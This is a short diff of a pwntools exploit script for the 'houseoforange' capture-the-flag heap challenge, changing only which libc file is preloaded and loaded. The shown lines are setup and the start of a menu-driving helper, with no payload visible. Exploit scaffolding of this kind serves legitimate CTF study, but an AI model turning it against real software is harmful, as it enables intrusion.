@@ -4,8 +4,8 @@ from pwn import *
 
 #context.log_level = 'debug'
 
-io = process(['./houseoforange'], env={'LD_PRELOAD':'./libc.so.6'})
-libc = ELF('libc.so.6')
+io = process(['./houseoforange'], env={'LD_PRELOAD':'./libc-2.23.so'})
+libc = ELF('libc-2.23.so')
 
 def build(size, name):
     io.sendlineafter("Your choice : ", '1')
